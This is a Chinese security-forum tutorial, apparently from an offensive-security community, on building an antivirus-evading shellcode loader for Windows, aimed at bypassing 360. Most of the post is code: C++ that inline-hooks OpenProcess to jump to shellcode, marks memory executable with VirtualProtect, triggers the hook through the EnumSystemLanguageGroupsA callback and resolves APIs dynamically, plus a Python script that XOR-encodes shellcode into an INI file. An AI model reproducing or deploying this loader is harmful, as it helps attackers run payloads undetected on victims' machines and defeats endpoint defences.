0x00 先展示效果图
===========

![finish.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0615c0505f0c0f05107afb2cd024866947f5f770.png)

![finish2.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8c57901a9213d9d08fc6d6df4c16c94e9cdbe743.png)

0x01 本文知识
=========

**1.shellcode的加解密**

这里我依旧是使用简单的异或和我上一篇文章的`GetPrivateProfileIntA`这个api来获取加密后的shellcode，只不过改进了一下，上一篇文章地址https://forum.butian.net/share/1805

![getint.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-115517c15602a78c1b46d3e2cc720125e04d12dd.png)

**2.virtualprotect**

官方介绍地址https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect  
简单来说可以把一块内存变为可写可读可执行

**3.EnumSystemLanguageGroupsA**

这个api的第一个参数是回调函数的指针，我们可以利用这一个参数执行我们的shellcode

![enum.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8da1294b47be601f0d45123a541809864a225bb2.png)  
剩余的参数跟着文档随便填即可，官方介绍https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlanguagegroupsa

**4.WriteProcessMemory**

该api在指定进程中写入内存，官方介绍https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

**5.GetProcAddress和GetModuleHandleA**

利用这两个api可以获取某个api的地址，从而利用函数指针进行动态调用

![addr.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-66b992f9a1bffe5c5d9e52af7d5103f36359b3ad.png)  
可以看到成功打印openprocess这个api的地址

**6.GetCurrentProcess**  
这个api是获取当前进程的句柄

**7.inline hook**  
inline hook的可以拦截某个api，当调用那个api的时候可以跳转到我们自定义的函数，这个时候我们可以跳转到我们的shellcode，从而执行shellcode

它的实现是更改程序写入`jmp 地址`来实现跳转，jmp指令一共需要5个字节，jmp对应的机器码为E9，在jmp命令中，后面跟的地址是偏移地址，而不是具体的地址，在inline hook中它的偏移地址计算公式为 `偏移量=目标地址-原始地址-5`，我们在使用时只需记住这个公式即可

师傅们可以在b站看下这个视频https://www.bilibili.com/video/BV1Ap4y1h72r?spm\_id\_from=333.337.search-card.all.click

**8,GetCurrentDirectoryA**  
该函数获取当前目录

![str.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f787cffb9dd845099c0079d452d200094e94bb05.png)  
**9.strcat**  
字符串拼接

![str.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cbe3d0b681fb33959a764aef8024c7112d99627f.png)  
**10.**`#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")`  
**作用是不显示黑窗口**

0x02 实战
=======

**本文inline hook实现免杀流程：  
1.构造跳转指令  
2.找到要hook的函数地址，把该函数的前5个字节改成我们跳转到shllcode的恶意指令  
3.运行该函数**

我们写一个类，类名为InLine，类中定义这三个成员变量

```php
BYTE NewByte[5]={0};//保存我们构造的jmp跳转指令
PROC FuncAddr;//存放需要跳转的函数地址
PROC HookFunc;//存放需要hook的api地址
```

然后在写一个构造函数

```php
 InLine(PROC Func){
    FuncAddr=Func;//把func赋值给FuncAddr
    if (FuncAddr == NULL) {
        exit(1);
    } //这里判段我们需要跳转到的函数的地址是否为空，如果为空，则退出
    hookFunc = GetProcAddress(
        GetModuleHandleA("Kernel32.dll"),
        "OpenProcess"
    );//这里是获取我们需要hook的api的地址，我们这里是hook OpenProcess这个api
    if (hookFunc == NULL) {
        exit(1);
    } //这里判段需要hook的api是否为空，如果是则退出
    SIZE_T d;
    Newbyte[0] = '\xE9';//这里构建jmp指令
    *(DWORD*)(Newbyte + 1) = (DWORD)FuncAddr - (DWORD)hookFunc - 5;//这里加1是为了不把jmp给覆盖，然后把偏移地址赋值到NewByte中
    WriteProcessMemory(GetCurrentProcess(), hookFunc, Newbyte, 5, &d);//这里就是把定义好的跳转指令写入到我们需要hook的api的前5个字节中
    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)hookFunc, LGRPID_INSTALLED, NULL);//这个api作用是利用第一个参数（回调函数）来执行我们修改了前5个字节的api
 }
```

我们的hook代码已经写完了，现在只需要把我们的shellcode所在的地方改为可执行，并且把shellcode的地址赋值给类中的funcaddr即可

```php
    unsigned char buf[] ="这里是shellcode";
    DWORD i;
    VirtualProtect(&buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &i);//PAGE_EXECUTE_READWRITE代表可读可写可执行
    InLine bh((PROC)&buf);
```

![class.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-46e683abcec0cdeadbf434e12087a47be3620e04.png)  
可以看到shellcode正常上线

接下来我们用GetProcAddress和GetModuleHandleA这两个api来动态调用我们的一些api

```php
typedef BOOL(WINAPI* Write)(
    HANDLE      hprocess,
    LPVOID      BaseAddr,
    LPCVOID     BUffer,
    SIZE_T      Size,
    SIZE_T*     NumberOfBytes
    );
Write Writer = (Write)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "WriteProcessMemory"
);

typedef BOOL(WINAPI* vp)(
    LPVOID      Address,
    DWORD       size,
    DWORD       New,
    PDWORD      Old
    );
vp vip = (vp)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "VirtualProtect"
);
```

随后我们把代码中的writeprocessmemory和virtualprotect这两个api分别换成Writer和vip

![write.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ecf1828a2e222600e13a83da3a9d1c7131a57a7a.png)

![VIP.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f3b92a58d0d73ff602f4b7bf3f18eb18624adf55.png)

**一切准备就绪，就差shellcode的加解密了**  
这里我用上一篇文章的方法，脚本也和上一篇文章一模一样，这里就不在多说了  
![getint.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-00c6f4772daf24193f30a598ed78e7c98fdc7d71.png)

```php
char path[MAX_PATH];
char abc[3000];
unsigned char cba[3000];
DWORD d;
vip(cba, sizeof(cba), PAGE_EXECUTE_READWRITE, &d);
GetCurrentDirectoryA(MAX_PATH, path);
strcat(path, "\\sc.ini");
for (int i = 0; i < 3000; i++) {
    _itoa_s(i, abc, 10);
    UINT ok = GetPrivateProfileIntA("key", abc, NULL, path);
    if (ok == 0) {break;}
    cba[i] = ok^1024;
}
InLine I((PROC)&cba);
```

Python shellcode加密代码（简单的异或加密）：

```php
print(" _")
print("| |__  _   _ _ __   __ _ ___ ___")
print("| '_ \| | | | '_ \ / _` / __/ __|")
print("| |_) | |_| | |_) | (_| \__ \__ \\")
print("|_.__/ \__, | .__/ \__,_|___/___/")
print("       |___/|_|")
shellcode_=b"" #shellcode放在这里shellcode放在这里
shellcode=[]
for i in shellcode_:
    shellcode.append(str(i^1024))
shellcode=",".join(shellcode).split(",")
file=open("sc.ini","w")
file.write("[key]\n")
n=0
for i in shellcode:
    file.write(f"{n}={i}\n")
    n+=1
file.close()
```

随后把sc.ini文件和exe文件放在同一目录运行后可以正常上线

![ll.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c24b6b4c2a5b51defbbae0d038e8f91470edfc5a.png)

0x03 结尾
=======

在命令行使用的时候，需要cd到exe和sc.ini文件所在的目录，不然无法上线!!!

完整代码我发在了github上，地址https://github.com/wz-wsl/360bypass

师傅们可以把SMC技术用到免杀上来，最后祝各位师傅们玩得开心呀！